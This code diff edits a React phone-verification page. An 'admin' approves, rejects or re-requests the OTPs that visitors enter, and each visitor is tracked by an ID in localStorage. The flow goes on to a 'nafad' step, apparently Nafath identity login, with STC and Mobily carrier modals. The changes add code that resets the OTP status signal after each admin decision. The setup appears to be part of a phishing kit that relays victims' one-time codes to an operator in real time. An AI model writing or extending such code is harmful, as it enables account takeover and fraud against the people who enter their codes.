@@ -80,7 +80,10 @@ export default function VerifyPhonePage() {
           handleOtpRejected()
         } else if (status === 'show_phone_otp') {
           console.log('[phone-info] Admin requested to show phone OTP dialog (resend)')
-          // Close waiting modals and reopen OTP dialog
+          const visitorID = localStorage.getItem('visitor')
+          if (visitorID) {
+            addData({ id: visitorID, phoneOtpStatus: null }).catch(err => console.error('[phone-info] Error clearing phoneOtpStatus:', err))
+          }
           setShowStcModal(false)
           setShowMobilyModal(false)
           setShowCarrierModal(false)
@@ -181,9 +184,19 @@ export default function VerifyPhonePage() {
     }
   }
 
-  const handleApproved = () => {
+  const handleApproved = async () => {
     // Admin approved phone OTP - close waiting modal and navigate to nafad
     console.log("[step5] Phone OTP approved, navigating to nafad")
+    
+    const visitorID = localStorage.getItem('visitor')
+    if (visitorID) {
+      try {
+        // Clear the phoneOtpStatus signal
+        await addData({ id: visitorID, phoneOtpStatus: null })
+      } catch (error) {
+        console.error('[step5] Error clearing phoneOtpStatus:', error)
+      }
+    }
     
     // Close all waiting modals
     setShowStcModal(false)
@@ -235,9 +248,19 @@ export default function VerifyPhonePage() {
     })
   }
 
-  const handleOtpRejected = () => {
+  const handleOtpRejected = async () => {
     // Admin rejected OTP - close waiting modals and reopen OTP dialog with error
     console.log("[step5] Phone OTP rejected, reopening dialog with error")
+    
+    const visitorID = localStorage.getItem('visitor')
+    if (visitorID) {
+      try {
+        // Clear the phoneOtpStatus signal
+        await addData({ id: visitorID, phoneOtpStatus: null })
+      } catch (error) {
+        console.error('[step5] Error clearing phoneOtpStatus:', error)
+      }
+    }
     
     // Close all waiting modals
     setShowStcModal(false)
